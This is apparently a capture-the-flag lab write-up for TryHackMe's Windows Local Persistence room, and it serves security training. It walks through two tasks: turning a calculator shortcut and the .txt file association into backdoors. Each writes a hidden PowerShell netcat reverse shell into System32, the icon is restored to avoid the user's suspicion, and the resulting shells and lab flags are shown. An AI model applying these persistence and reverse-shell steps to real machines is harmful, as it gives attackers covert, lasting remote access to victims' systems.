# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/05/2023

# Shortcut Files
1. Started up this room's machine
2. Opened up the compromised Windows machine's calculator properties window

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)

3. `PowerShell` from the compromised Windows machine to open up PowerShell, which we'll then use to create a PowerShell (.ps1) script containing a payload that we'll use to connect back to our netcat listener that we'll later set up on our Linux machine, in the compromised machine's **C:\Windows\System32** directory
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
3.1 `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`
3.2 `$scriptContent = @"`
3.3 `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>"`
3.4 `C:\Windows\System32\calc.exe`
3.5 `"@` 
3.6 `Set-Content -Path $scriptPath -Value $scriptContent`
```PowerShell
PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1'
>> $scriptContent = @"
>> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.210.65 9999"
>> C:\Windows\System32\calc.exe
>> "@
>> Set-Content -Path $scriptPath -Value $scriptContent
>>
```
4. Change the calculator's target path to be 'powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT NAME>.ps1', which will stealthly execute our payload, and change back the calculator's icon back to its default icon to ensure that the user doesn't suspect a thing, since the icon will most likely change after changing it's target path

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20Properties%20Zoomed%20In.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)

5. `nc -lvnp <PORT NUMBER>`  from our Linux attack machine to set up our netcat listener that'll listen for any inbound connections
```Bash
root@ip-10-10-210-65:~# nc -lnvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
6. Click on the calculator on the compromised Windows machine, which ended up stealthly executing our payload allowing us to create a reverse shell that connected back to our netcat listener on our attack machine

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Backdoor%20Script%20Executed%20.png)

```Bash
root@ip-10-10-210-65:~# nc -lnvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.105.224 49982 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
7. `C:\flags\flag5.exe` from our reverse shell to run the **flag5.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag5.exe
C:\flags\flag5.exe
THM{NO_SHORTCUTS_IN_LIFE}
```


**TASK COMPLETED**

# Hijacking File Associations
1. Started this room's machine
2. `regedit` from the compromised Windows machine to open up the Registry Editor (**Regedit**), which we'll then go and later modify the data in the **Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command** registry, since this is what'll get executed whenever we open a **.txt** file on the compromised WIndows machine
```PowerShell
C:\Users\Administrator>regedit
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20Zoomed%20In.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202%20Zoomed%20In.png)

3. `PowerShell` from the compromised Windows machine to open up PowerShell, which we'll then use to create a PowerShell (.ps1) script containing a payload that we'll use to connect back to our netcat listener that we'll later set up on our Linux machine, in the compromised machine's **C:\Windows\System32** directory
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
3.1 `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`
3.2 `$scriptContent = @"`
3.3 `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>"`
3.4 `C:\Windows\system32\NOTEPAD.EXE $args[0]`
3.5 `"@` 
3.6 `Set-Content -Path $scriptPath -Value $scriptContent`
```PowerShell
PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1'
>> $scriptContent = @"
>> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.173.81 9999"
>> C:\Windows\system32\NOTEPAD.EXE $args[0]
>> "@
>> Set-Content -Path $scriptPath -Value $scriptContent
PS C:\Users\Administrator>
```
4. We'll go back into the Registry Editor that opened up already and we'll change the **textfile**'s current value data to be `powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT FILE>.ps1 %1`, which will allow our backdoor script to be executed everytime a user open a text file on the compromised machine 

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Default%20Value%20Data.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data%20pt2.png)

5. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to set up our netcat listener that'll listen for any inbound connections
```Bash
root@ip-10-10-173-81:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

6. Once our netcat listener, from the compromised Windows machine, we'll open any text file to execute our created payload, which ended up doing so and connecting back to our netcat listener on our attack machine 

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/txt%20File%20Opened.png)

```Bash
root@ip-10-10-173-81:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.141.70 49905 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>
```
7. `C:\flags\flag6.exe` from our reverse shell to run the **flag6.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Users\Administrator\Desktop>C:\flags\flag6.exe
C:\flags\flag6.exe
THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
```


**TASK COMPLETED**
